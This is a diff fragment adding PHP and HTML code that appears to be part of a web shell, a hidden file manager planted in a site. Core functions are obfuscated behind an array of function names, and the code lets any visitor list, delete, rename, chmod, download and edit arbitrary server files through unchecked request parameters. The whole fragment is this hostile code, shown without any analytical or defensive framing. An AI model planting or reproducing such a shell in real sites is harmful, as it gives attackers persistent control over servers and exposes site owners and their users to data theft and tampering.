@@ -1,0 +1,10 @@
+</span></h2>
+<?php if($M1): ?><div class="msg"><?= $M1 ?></div></p>
+
+<table><tr><th>Name</th><th>Size</th><th>Perm</th><th>Actions</th></tr>
+<?php foreach($fs as $f){if($f=='.' || $f=='..')continue;$fl=$P1.DIRECTORY_SEPARATOR.$f;$id=$V1[16]($fl);$pm=substr(sprintf('%o',$V1[19]($fl)),-4);$sz=$id?'-':$V1[21]($V1[20]($fl)/1024,2).' KB';
+if($pm == '0444' || $pm == '0555' || $pm == '0400') { $cl = 'style="color:#f00;font-weight:bold;"'; } else { $cl = 'style="color:#0f0;font-weight:bold;"'; }
+echo "<tr><td>".($id?"📁":"📄")." <a href='?path=".$V1[15]($fl)."'>$f</a></td><td>$sz</td><td><span $cl>$pm</span></td><td class=\"act-c\"><a href='?delete=".$V1[15]($fl)."' onclick=\"return confirm('?')\">🗑️</a> <a href='?rename=".$V1[15]($fl)."'>🏷️</a> ".(!$id?"<a href='?path=".$V1[15]($P1)."&download=".$V1[15]($fl)."'>⬇️</a> <a href='?edit=".$V1[15]($fl)."'>✏️</a>":"")." <form method='post' style='display:inline;'><input type='hidden' name='chmod_file' value='$fl'><input type='text' name='chmod_value' placeholder='P' style='width:30px;'><button type='submit'>🔒</button></form></td></tr>";} ?>
+</table>
+<?php if(isset($_GET['rename'])): $t=$_GET['rename']; ?><div style="margin-top:20px;border:1px solid #444;padding:15px;"><h3 style="color:#fff;">Rename: <?= $V1[3]($t) ?></h3><form method="post" action="?path=<?= $V1[15]($P1) ?>"><input type="hidden" name="old_name" value="<?= $V1[22]($t) ?>"><input type="text" name="new_name" value="<?= $V1[22]($V1[3]($t)) ?>"><button type="submit">OK</button></form></div><?php endif; ?>
+<?php if(isset($_GET['edit'])&&is_file($_GET['edit'])): $te=$_GET['edit'];$c=$V1[22]($V1[23]($te)); ?><h3 style="color:#fff;">Edit: <?= $V1[3]($te) ?></h3><form method="post" action="?path=<?= $V1[15]($V1[9]($te)) ?>"><input type="hidden" name="edit_file_path" value="<?= $V1[22]($te) ?>"><textarea name="edited_content" rows="15" style="width:100%"><?= $c ?></textarea><br><button type="submit">Save</button></form>
